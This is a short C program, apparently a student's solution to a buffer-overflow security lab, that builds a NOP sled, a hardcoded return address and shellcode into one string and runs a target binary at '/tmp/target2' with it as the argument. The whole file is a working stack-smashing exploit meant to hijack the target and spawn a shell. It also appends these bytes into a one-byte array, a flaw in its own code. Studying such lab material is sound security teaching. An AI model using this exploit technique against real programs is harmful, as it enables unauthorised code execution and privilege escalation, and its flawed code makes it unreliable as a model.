#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target2"

#define NOP "\x90"

#define SH_AD "\x08\xfd\xff\xbf"

char name[] = "";


int main(void)
{
  char *args[3];
  char *env[1];

  int num = 124;
  //scanf("\n%d", &num);

  int i;
  for(i=0; i<num; i++) {
    strcat(name, NOP);
  }

  strcat(name, SH_AD);

  strcat(name, shellcode);
  //strcat(name, SP);

  for(i=0; i<67; i++) {
    strcat(name, NOP);  
  }

  //printf("%s", name);

  args[0] = TARGET; args[1] = name; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}

